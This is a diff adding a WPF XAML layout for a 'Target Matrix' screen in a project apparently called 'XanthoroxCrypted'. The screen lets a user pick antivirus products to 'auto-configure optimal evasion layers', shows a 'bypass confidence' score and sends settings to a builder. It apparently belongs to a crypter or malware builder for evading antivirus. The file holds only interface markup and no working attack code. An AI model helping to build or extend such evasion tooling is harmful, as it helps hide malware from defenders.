@@ -1,0 +1,225 @@
+<UserControl x:Class="XanthoroxCrypted.Views.TargetView"
+             xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
+             xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
+             mc:Ignorable="d"
+             xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006"
+             xmlns:d="http://schemas.microsoft.com/expression/blend/2008"
+             d:DesignHeight="700" d:DesignWidth="820">
+
+    <UserControl.Resources>
+        <!-- ═══ AV Card Style ═══ -->
+        <Style x:Key="Style_AvCard" TargetType="Border">
+            <Setter Property="Background" Value="#1A1A2E"/>
+            <Setter Property="CornerRadius" Value="8"/>
+            <Setter Property="Padding" Value="12,10"/>
+            <Setter Property="Margin" Value="4"/>
+            <Setter Property="BorderBrush" Value="#2A2A3E"/>
+            <Setter Property="BorderThickness" Value="1"/>
+            <Setter Property="Cursor" Value="Hand"/>
+        </Style>
+
+        <!-- Engine Tag Style -->
+        <Style x:Key="Style_EngineTag" TargetType="Border">
+            <Setter Property="Background" Value="#0D2137"/>
+            <Setter Property="CornerRadius" Value="3"/>
+            <Setter Property="Padding" Value="5,2"/>
+            <Setter Property="Margin" Value="0,0,4,0"/>
+        </Style>
+
+        <!-- Coverage Bar Background -->
+        <Style x:Key="Style_BarBg" TargetType="Border">
+            <Setter Property="Background" Value="#1A1A2E"/>
+            <Setter Property="CornerRadius" Value="3"/>
+            <Setter Property="Height" Value="6"/>
+        </Style>
+
+        <!-- Countermeasure Chip -->
+        <Style x:Key="Style_CMChip" TargetType="Border">
+            <Setter Property="Background" Value="#0A2A1A"/>
+            <Setter Property="CornerRadius" Value="4"/>
+            <Setter Property="Padding" Value="8,5"/>
+            <Setter Property="Margin" Value="0,0,6,6"/>
+            <Setter Property="BorderBrush" Value="#1A4A2E"/>
+            <Setter Property="BorderThickness" Value="1"/>
+        </Style>
+
+        <!-- Score Circle Gradient -->
+        <LinearGradientBrush x:Key="Brush_ScoreGlow" StartPoint="0,0" EndPoint="1,1">
+            <GradientStop Color="#00E5FF" Offset="0"/>
+            <GradientStop Color="#7C4DFF" Offset="1"/>
+        </LinearGradientBrush>
+    </UserControl.Resources>
+
+    <Grid>
+        <Grid.RowDefinitions>
+            <RowDefinition Height="Auto"/>
+            <RowDefinition Height="Auto"/>
+            <RowDefinition Height="*"/>
+            <RowDefinition Height="Auto"/>
+        </Grid.RowDefinitions>
+
+        <!-- ═══ HEADER ═══ -->
+        <StackPanel Grid.Row="0" Margin="24,20,24,0">
+            <StackPanel Orientation="Horizontal" Margin="0,0,0,4">
+                <TextBlock Text="🎯" FontSize="20" Margin="0,0,10,0" VerticalAlignment="Center"/>
+                <TextBlock Text="TARGET MATRIX" FontSize="20" FontWeight="Bold"
+                           Foreground="{StaticResource Brush_TextPrimary}" VerticalAlignment="Center"/>
+                <Border Background="#0D2137" CornerRadius="4" Padding="8,3" Margin="14,0,0,0"
+                        VerticalAlignment="Center">
+                    <TextBlock x:Name="TxtSelectedCount" Text="0 / 40 SELECTED" FontSize="10"
+                               Foreground="#00E5FF" FontWeight="SemiBold"/>
+                </Border>
+            </StackPanel>
+            <TextBlock Text="Select target antivirus products to auto-configure optimal evasion layers."
+                       Foreground="{StaticResource Brush_TextSecondary}" FontSize="11" Margin="0,0,0,0"/>
+        </StackPanel>
+
+        <!-- ═══ TOOLBAR: Search + Actions ═══ -->
+        <Grid Grid.Row="1" Margin="24,14,24,8">
+            <Grid.ColumnDefinitions>
+                <ColumnDefinition Width="*"/>
+                <ColumnDefinition Width="Auto"/>
+            </Grid.ColumnDefinitions>
+
+            <!-- Search Box -->
+            <Border Grid.Column="0" Background="#12121C" CornerRadius="6" Padding="10,8"
+                    BorderBrush="#2A2A3E" BorderThickness="1" Margin="0,0,10,0">
+                <Grid>
+                    <Grid.ColumnDefinitions>
+                        <ColumnDefinition Width="Auto"/>
+                        <ColumnDefinition Width="*"/>
+                    </Grid.ColumnDefinitions>
+                    <TextBlock Text="🔍" FontSize="13" Margin="0,0,8,0" VerticalAlignment="Center"
+                               Opacity="0.6"/>
+                    <TextBox x:Name="TxtSearch" Grid.Column="1" Background="Transparent"
+                             Foreground="{StaticResource Brush_TextPrimary}" FontSize="12"
+                             BorderThickness="0" VerticalAlignment="Center"
+                             TextChanged="TxtSearch_TextChanged"/>
+                </Grid>
+            </Border>
+
+            <!-- Actions -->
+            <StackPanel Grid.Column="1" Orientation="Horizontal">
+                <Button Content="SELECT ALL" Click="BtnSelectAll_Click"
+                        Style="{StaticResource Style_BtnNav}" FontSize="10" Padding="12,7"
+                        Margin="0,0,4,0"/>
+                <Button Content="CLEAR" Click="BtnClear_Click"
+                        Style="{StaticResource Style_BtnNav}" FontSize="10" Padding="12,7"
+                        Margin="0,0,4,0"/>
+                <Button x:Name="BtnApply" Click="BtnApply_Click" Padding="14,7"
+                        Margin="0" Cursor="Hand" FontSize="10" FontWeight="Bold"
+                        Foreground="White" BorderThickness="0">
+                    <Button.Template>
+                        <ControlTemplate TargetType="Button">
+                            <Border x:Name="ApplyBorder" CornerRadius="6" Padding="{TemplateBinding Padding}"
+                                    Background="{StaticResource Brush_ScoreGlow}">
+                                <ContentPresenter HorizontalAlignment="Center" VerticalAlignment="Center"/>
+                            </Border>
+                            <ControlTemplate.Triggers>
+                                <Trigger Property="IsMouseOver" Value="True">
+                                    <Setter TargetName="ApplyBorder" Property="Opacity" Value="0.85"/>
+                                </Trigger>
+                            </ControlTemplate.Triggers>
+                        </ControlTemplate>
+                    </Button.Template>
+                    <StackPanel Orientation="Horizontal">
+                        <TextBlock Text="⚡" FontSize="11" Margin="0,0,5,0"/>
+                        <TextBlock Text="APPLY TO BUILDER" FontSize="10" FontWeight="Bold"/>
+                    </StackPanel>
+                </Button>
+            </StackPanel>
+        </Grid>
+
+        <!-- ═══ MAIN CONTENT: Split — AV Grid + Analysis Panel ═══ -->
+        <Grid Grid.Row="2" Margin="24,0,24,0">
+            <Grid.ColumnDefinitions>
+                <ColumnDefinition Width="*"/>
+                <ColumnDefinition Width="280"/>
+            </Grid.ColumnDefinitions>
+
+            <!-- LEFT: AV Grid (Scrollable) -->
+            <ScrollViewer Grid.Column="0" VerticalScrollBarVisibility="Auto"
+                          HorizontalScrollBarVisibility="Disabled" Margin="0,0,12,0">
+                <WrapPanel x:Name="PanelAvGrid" Orientation="Horizontal"/>
+            </ScrollViewer>
+
+            <!-- RIGHT: Analysis Panel -->
+            <ScrollViewer Grid.Column="1" VerticalScrollBarVisibility="Auto"
+                          HorizontalScrollBarVisibility="Disabled">
+                <StackPanel>
+
+                    <!-- Score Circle -->
+                    <Border Background="#12121C" CornerRadius="10" Padding="16" Margin="0,0,0,10"
+                            BorderBrush="#2A2A3E" BorderThickness="1">
+                        <StackPanel HorizontalAlignment="Center">
+                            <TextBlock Text="BYPASS CONFIDENCE" FontSize="10" FontWeight="SemiBold"
+                                       Foreground="{StaticResource Brush_TextSecondary}"
+                                       HorizontalAlignment="Center" Margin="0,0,0,10"/>
+
+                            <!-- Score Ring -->
+                            <Grid Width="120" Height="120" HorizontalAlignment="Center">
+                                <!-- Background ring -->
+                                <Ellipse Width="120" Height="120" StrokeThickness="8"
+                                         Stroke="#1A1A2E"/>
+                                <!-- Score ring (visual only — actual arc set in code-behind) -->
+                                <Ellipse x:Name="ScoreRing" Width="120" Height="120"
+                                         StrokeThickness="8" Stroke="{StaticResource Brush_ScoreGlow}"
+                                         StrokeDashArray="0 100"
+                                         StrokeDashCap="Round"
+                                         RenderTransformOrigin="0.5,0.5">
+                                    <Ellipse.RenderTransform>
+                                        <RotateTransform Angle="-90"/>
+                                    </Ellipse.RenderTransform>
+                                </Ellipse>
+                                <!-- Score text -->
+                                <StackPanel VerticalAlignment="Center" HorizontalAlignment="Center">
+                                    <TextBlock x:Name="TxtScore" Text="0" FontSize="32" FontWeight="Bold"
+                                               Foreground="{StaticResource Brush_TextPrimary}"
+                                               HorizontalAlignment="Center"/>
+                                    <TextBlock Text="%" FontSize="14"
+                                               Foreground="{StaticResource Brush_TextSecondary}"
+                                               HorizontalAlignment="Center" Margin="0,-6,0,0"/>
+                                </StackPanel>
+                            </Grid>
+
+                            <!-- Threat Level -->
+                            <Border x:Name="ThreatBadge" Background="#2A1A0A" CornerRadius="4"
+                                    Padding="10,4" Margin="0,12,0,0" HorizontalAlignment="Center">
+                                <TextBlock x:Name="TxtThreat" Text="NO TARGET" FontSize="10"
+                                           FontWeight="Bold" Foreground="#FF9800"
+                                           HorizontalAlignment="Center"/>
+                            </Border>
+                        </StackPanel>
+                    </Border>
+
+                    <!-- Engine Coverage Bars -->
+                    <Border Background="#12121C" CornerRadius="10" Padding="14" Margin="0,0,0,10"
+                            BorderBrush="#2A2A3E" BorderThickness="1">
+                        <StackPanel>
+                            <TextBlock Text="ENGINE COVERAGE" FontSize="10" FontWeight="SemiBold"
+                                       Foreground="{StaticResource Brush_TextSecondary}" Margin="0,0,0,10"/>
+                            <StackPanel x:Name="PanelCoverage"/>
+                        </StackPanel>
+                    </Border>
+
+                    <!-- Required Countermeasures -->
+                    <Border Background="#12121C" CornerRadius="10" Padding="14" Margin="0,0,0,10"
+                            BorderBrush="#2A2A3E" BorderThickness="1">
+                        <StackPanel>
+                            <TextBlock Text="REQUIRED LAYERS" FontSize="10" FontWeight="SemiBold"
+                                       Foreground="{StaticResource Brush_TextSecondary}" Margin="0,0,0,10"/>
+                            <WrapPanel x:Name="PanelCountermeasures" Orientation="Horizontal"/>
+                        </StackPanel>
+                    </Border>
+
+                </StackPanel>
+            </ScrollViewer>
+        </Grid>
+
+        <!-- ═══ STATUS BAR ═══ -->
+        <Border Grid.Row="3" Background="#0A0A14" Padding="24,8" Margin="0,8,0,0">
+            <TextBlock x:Name="TxtStatus" Text="Select target AVs to begin analysis."
+                       Foreground="{StaticResource Brush_TextSecondary}" FontSize="11"/>
+        </Border>
+    </Grid>
+</UserControl>
